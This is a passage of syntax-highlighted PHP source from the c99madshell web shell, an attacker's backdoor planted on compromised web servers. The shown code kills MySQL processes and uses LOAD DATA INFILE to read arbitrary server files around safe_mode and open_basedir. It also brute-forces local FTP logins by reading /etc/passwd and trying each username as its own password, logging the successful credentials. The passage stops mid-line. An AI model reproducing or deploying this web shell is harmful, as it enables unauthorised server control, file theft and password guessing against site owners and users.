     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server variables:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$kill</span><span class="p">))</span> <span class="p">{</span><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;KILL &quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Killing process #&quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot;... ok. he is dead, amen.&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW PROCESSLIST&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Processes:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;ID&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;USER&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;HOST&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;DB&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;COMMAND&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;TIME&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;STATE&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;INFO&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_act.value=&#39;processes&#39;;document.sql.kill.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;Kill&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;getfile&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$tmpdb</span> <span class="o">=</span> <span class="nv">$sql_login</span><span class="o">.</span><span class="s2">&quot;_tmpdb&quot;</span><span class="p">;</span>
     <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$select</span><span class="p">)</span> <span class="p">{</span><span class="nb">mysql_create_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$created</span> <span class="o">=</span> <span class="o">!!</span><span class="nv">$select</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$select</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="nv">$created</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
      <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );&quot;</span><span class="p">);</span>
      <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;LOAD DATA INFILE </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> INTO TABLE tmp_file&quot;</span><span class="p">);</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM tmp_file;&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error in reading file (permision denied)!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">else</span>
      <span class="p">{</span>
       <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);}</span>
       <span class="nv">$f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
       <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span><span class="nv">$f</span> <span class="o">.=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$row</span><span class="p">);}</span>
       <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> does not exists or empty!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
       <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DROP TABLE tmp_file;&quot;</span><span class="p">);</span>
      <span class="p">}</span>
     <span class="p">}</span>
     <span class="nb">mysql_drop_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="c1">//comment it if you want to leave database</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_sock</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$affected</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_affected_rows</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$affected</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$affected</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)){</span><span class="nv">$affected</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Affected rows: &quot;</span><span class="o">.</span><span class="nv">$affected</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;mkdir&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$mkdir</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mkdir</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Make Dir </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkdir</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;: object alredy exists&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$mkdir</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Make Dir </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkdir</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;: access denied&quot;</span><span class="p">;}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="nv">$act</span> <span class="o">=</span> <span class="nv">$dspact</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ftpquickbrute&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Ftp Quick brute:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">win</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;This functions not work in Windows!&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="k">function</span> <span class="nf">c99ftpbrutecheck</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="nv">$sh</span><span class="p">,</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span><span class="nv">$TRUE</span> <span class="o">=</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sh</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;/bin/FALSE&quot;</span><span class="p">,</span><span class="s2">&quot;/sbin/nologin&quot;</span><span class="p">)));}</span>
   <span class="k">else</span> <span class="p">{</span><span class="nv">$TRUE</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$TRUE</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$sock</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">ftp://&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Connected to &quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;.&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nb">ob_flush</span><span class="p">();</span>
     <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fqb_lenght&#39;</span><span class="p">]))</span> <span class="nv">$fqb_lenght</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fqb_lenght&#39;</span><span class="p">];</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$fqb_lenght</span><span class="p">))</span> <span class="p">{</span><span class="nv">$fqb_lenght</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;}</span>
   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t get /etc/passwd for password-list.&quot;</span><span class="p">;}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fqb_logging&#39;</span><span class="p">]))</span> <span class="nv">$fqb_logging</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fqb_logging&#39;</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logging</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fqb_logfile&#39;</span><span class="p">]))</span> <span class="nv">$fqb_logging</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fqb_logfile&#39;</span><span class="p">];</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);}</span>
     <span class="k">else</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}</span>
     <span class="nv">$fqb_log</span> <span class="o">=</span> <span class="s2">&quot;FTP Quick Brute (called c99madshell v. &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;) started at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>

<span class="s2">&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
    <span class="p">}</span>
    <span class="nb">ob_flush</span><span class="p">();</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$ftpquick_st</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="nv">$str</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">2048</span><span class="p">));</span>
     <span class="k">if</span> <span class="p">(</span><span class="nx">c99ftpbrutecheck</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="nv">$fqb_onlywithsh</span><span class="p">))</span>
     <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
      <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
      <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
      <span class="nb">ob_flush</span><span class="p">();</span>
     <span class="p">}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$fqb_lenght</span><span class="p">)</span> <span class="p">{</span><span class="k">break</span><span class="p">;}</span>
     <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$success</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No success. connections!&quot;</span><span class="p">;</span> <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;No success. connections!</span>
<span class="s2">&quot;</span><span class="p">;}</span>
    <span class="nv">$ftpquick_t</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$ftpquick_st</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;b&amp;gt;Done!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Success.: &amp;lt;font color=green&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span 